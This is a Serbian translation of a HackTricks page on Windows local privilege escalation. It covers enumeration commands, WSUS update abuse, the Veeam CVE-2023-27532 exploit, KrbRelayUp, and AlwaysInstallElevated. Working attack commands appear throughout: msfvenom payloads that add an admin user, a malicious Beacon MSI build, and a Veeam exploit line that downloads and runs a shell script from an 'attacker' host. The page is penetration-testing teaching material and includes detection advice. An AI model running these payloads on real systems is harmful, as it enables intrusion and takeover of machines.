# Lokalna eskalacija privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za lokalnu eskalaciju privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima uključuje prezentaciju sa DerbyCon-a o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnovna teorija Windows-a

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole Windows-a

Windows sadrži različite mehanizme koji mogu **da vas spreče da enumerišete sistem**, pokrećete izvršne datoteke ili čak **otkriju vaše aktivnosti**. Pre nego što počnete enumeraciju radi eskalacije privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **mehanizme** **odbrane**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može i da omogući da se izmena UEFI NVRAM-a van mreže pretvori u DMA napad pre pokretanja sistema, a zatim u lanac izmena Windows `SYSTEM` memorije:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiho podizanje privilegija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL bez upita, kada se zaobiđu provere bezbedne putanje u AppInfo. Pogledajte namenski tok za zaobilaženje UIAccess/Admin Protection ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra za pristupačnost na Secure Desktop-u može se zloupotrebiti za proizvoljno upisivanje u SYSTEM registar (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju **SMB arbitrary-port**, u kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo korišćene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li verzija Windows-a ima poznate ranjivosti (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti specifični za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pronalaženje detaljnih informacija o bezbednosnim ranjivostima u Microsoft proizvodima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu napada** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje verziju OS-a, instalirane ispravke i potencijalne savete; proverite tačan proizvod i zamenjene ispravke pre nego što rezultat smatrate primenljivim.

Za lokalni exploit specifičan za verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` obično vodi do 32-bitnog sistemskog direktorijuma, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili potencijalno nedostajuća KB ispravka ne dokazuju da je sistem ranjiv; uporedite pokrenutu verziju, instaliranu ili zamensku ispravku, arhitekturu procesa i preduslove exploita sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

**Lokalno, pomoću informacija o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploita:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neki kredencijali ili korisne informacije sačuvani u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Datoteke PowerShell transkripata

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično upisuje datoteke u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` mogu preusmeriti datoteke u deljenu ili skrivenu fasciklu. Pre nego što pregledate transcript, proverite efektivnu putanju za izlaz i ACL datoteke: može sadržati argumente komandi i njihov izlaz, uključujući akreditive. Transcript kojem možete pristupiti predstavlja trag samo ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku dokumentacije „Transcript files“ i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowerShell evidencija, možete da izvršite:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i kompletan sadržaj izvršavanja skripte, čime se osigurava da se svaki blok koda dokumentuje tokom izvršavanja. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaje za Script Block možete pronaći u Windows Event Viewer-u na putanji: **Dnevnici aplikacija i usluga > Microsoft > Windows > PowerShell > Operativno**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

HTTP WSUS endpoint je povod za proveru mogućeg presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila poverenja i instalacije ažuriranja. Sam URL ne potvrđuje mogućnost izvršavanja koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Za početak proverite da li mreža koristi WSUS ažuriranje bez SSL-a tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisani intranet servis. To potvrđuje preduslov za putanju HTTP presretanja, ali ne dokazuje da je presretanje moguće, da će zlonamerna ažuriranja biti prihvaćena niti da se mogu instalirati sa povišenim privilegijama. Kada je postavljen na `0`, ta konkretna konfigurisana WSUS krajnja tačka nije izabrana ovom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su naoružane MiTM skripte za eksploataciju koje ubacuju „lažna“ ažuriranja u WSUS saobraćaj koji nije zaštićen SSL-om.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Ovde pročitajte ceo izveštaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U suštini, ova greška iskorišćava sledeći propust:

> Ako možemo da izmenimo proxy podešavanja svog lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima programa Internet Explorer, onda možemo lokalno pokrenuti [PyWSUS](https://github.com/GoSecure/pywsus) da presretnemo sopstveni saobraćaj i pokrenemo kod sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS servis koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za sprovođenje validacije tipa trust-on-first-use sertifikata. Ako korisnik veruje prikazanom sertifikatu i on ima ispravan hostname, servis će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja kojima upravlja WSUS administrator

Postoji odvojena putanja ako trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sve delegirane WSUS dozvole, a zatim utvrdite kojoj grupi klijenata bi odobreno ažuriranje bilo isporučeno. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da je primenljiv na cilj i da se instalira u kontekstu sa višim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuje te uslove.

### Zloupotreba prilagođenih ažuriranja SUSDB: nepotpisani sadržaji preko `.txt`/`.esd`

Ovo je drugačiji propust na granici poverenja od presretanja HTTP veze ka WSUS-u: preduslov je dovoljan pristup **uskladištenim procedurama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način za početni pristup jeste prosleđivanje naloga računara WSUS-a uzvodno ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; konkretni preduslovi zavise od implementacije, zato prvo utvrdite dozvole `EXECUTE` umesto da pretpostavite da su potrebna administratorska prava za SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Za odvojenu napadnu putanju koja prosleđuje autentifikaciju WSUS klijenta sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-u pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Izrada, ciljanje i odobravanje ažuriranja

Tok rada sa prilagođenim ažuriranjem koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvoz metapodataka ažuriranja | `spImportUpdate` |
| Čuvanje XML fragmenata za preduslove, lokalizaciju i proširene podatke | `spSaveXMLFragment` |
| Povezivanje digest-a sadržaja sa URL-om pod kontrolom napadača | `spSetBatchURL` |
| Nabrajanje/kreiranje grupe računara i dodavanje klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobravanje instalacije za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, digest-i, veličina i rukovalac `CommandLineInstallation` moraju da se poklapaju u uvezenim metapodacima/fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje liči na sledeće; koristite nove identifikatore za ažuriranje, grupu i implementaciju umesto da ponovo upotrebite primere GUID-ova.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje provere potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, .NET putanja `VerifyFile` postavlja zastavicu provere sertifikata na false kada se dostavljeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače bez prethodne provere da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE fajl, nazvan, na primer, `payload.exe.txt`, može da prođe proveru sadržaja, a zatim da ga pokrene rukovalac za instalaciju iz komandne linije u okviru ažuriranja. Ovo je greška u politici/tipovima, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Priprema sadržaja i automatizacija kompatibilni sa BITS-om

Pozivom funkcije `spDeployUpdate` WSUS preuzima registrovani sadržaj. Izvor mora da ispunjava HTTP očekivanja BITS-a: samo URL kojem se može pristupiti nije dovoljan, jer prenos koristi početni tok `HEAD`/`GET` i zahteve za opseg bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, u kojem se navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za pripremu sadržaja. Minimalno pokretanje u ovlašćenom laboratorijskom okruženju je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Neinteraktivno izvršavanje i perzistencija kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema konfigurisanom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije je ažuriranje ostalo neuspešno/nedovršeno ponovo je odmah ponuđen nakon izlaska callback procesa, pa ponašanje pri ponovnom pokušaju može postati perzistencija kroz ponovljeno izvršavanje; to je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti za detekciju i ojačavanje zaštite

Korisne mogućnosti za proveru na strani servera i klijenta u okviru ovog lanca su:<sup>[[39]](#references)</sup>

- Proveravajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove grupe za ciljanje, spoljne izvore sadržaja, payload-e za ažuriranje `.txt`/`.esd` i primene koje su izvršili neočekivani nalozi (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju s ekstenzijom payloada i magičnim bajtovima sadržaja, umesto da verujete sufiksu.
- Potražite instalacije Windows Update koje ponavljano ne uspevaju/pokušavaju ponovo, kao i PE izvršavanje ili neočekivanu aktivnost podređenih procesa/mreže iz sadržaja sa nazivima `.txt` ili `.esd`.
- Tamo gde je podržano, zahtevajte Extended Protection for Authentication za servis baze podataka i ograničite mrežni pristup bazi na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na najmanju moguću meru i proveravajte njihovu upotrebu.

## Auto-updateri trećih strana i Agent IPC (lokalni privesc)

Mnogi poslovni agenti izlažu lokalnu IPC površinu i privilegovani kanal za ažuriranje. Ako se proces upisa može preusmeriti na napadačev server, a updater veruje lažnom root CA sertifikatu ili koristi slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji instalira SYSTEM servis. Ovde pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Veeam Backup & Replication i Cloud Connect koriste osnovni servis za rezervne kopije na **TCP/9401 podrazumevano**. [Veeam-ovo obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze konfiguracije unutar perimetra mreže za rezervne kopije; zaseban javni PoC prikazuje putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže i izvan localhost adrese, zato proverite stvarnu adresu i PID.

- **Recon**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim pregledajte instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` služe kao tragovi, ali nisu potpuna provera zakrpa.
- **Minimalne ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; prethodna izdanja su pogođena. Sama četvorodelna verzija datoteke ne može da razlikuje nezakrpljenu osnovnu verziju od kasnije zakrpe na istim brojevima build-a. Pre nego što build na granici proglasite ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Exploit**: smestite PoC kao što je `VeeamHax.exe` zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Navedeni PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.
## KrbRelayUp

Lokalni Kerberos relay može da omogući prelaz sa prijave sa nižim privilegijama na upis u privilegovani direktorijum kada se odgovarajući COM server autentifikuje, a prosleđeni principal ima dozvole nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuću delegaciju i dozvole nad ciljnim objektom, dok shadow-credential lanac zahteva dozvole za upis key-credential podataka i KDC koji podržava putanju autentifikacije pomoću sertifikata. Nijedna putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za prosleđeni identitet i nivoe autentifikacije i impersonation izabrane COM klase. Važni su tip prijave pozivaoca i kontekst akreditiva: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. Rutiranje kroz firewall/OXID i instalirane ispravke takođe mogu da utiču na rezultat. Permisivnu smernicu ili odgovarajući ACL smatrajte kandidatom za pregled; pasivna enumeracija ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinskog tiketa i, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registratora **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvrše) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up-a da biste u trenutnom direktorijumu kreirali Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovih alata. Imajte na umu da možete da obmotate „**.bat**“ fajl ako samo želite da **izvršite** **komandne linije**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Kreiranje MSI-ja pomoću Visual Studio-a

- Pomoću Cobalt Strike-a ili Metasploit-a **generišite** **novi Windows EXE TCP payload** u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i u polje za pretragu unesite „installer“. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Unesite naziv projekta, na primer **AlwaysPrivesc**, za lokaciju koristite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikćite na **Next** dok ne dođete do koraka 3 od 4 (izbor fajlova za uključivanje). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer-u**, a zatim u **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Možete da promenite i druga svojstva, kao što su **Author** i **Manufacturer**, kako bi instalirana aplikacija izgledala legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite fajl **beacon.exe** i kliknite na **OK**. Tako će se Beacon payload izvršiti čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** na **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste platformu podesili na x64.

### Instalacija MSI-ja

Da biste **instalaciju** zlonamernog `.msi` fajla izvršili **u pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Podešavanja nadzora

Ova podešavanja određuju šta se **beleži**, zato bi trebalo da obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumično generisana i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju i mogu im pristupiti samo korisnici kojima su putem ACL-ova dodeljene dovoljne dozvole, što im omogućava da vide lozinke lokalnog admin naloga ako su za to ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u čistom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Od **Windows 8.1**, Microsoft je uveo poboljšanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime dodatno štiti sistem.\
[**Više informacija o LSA Protection potražite ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

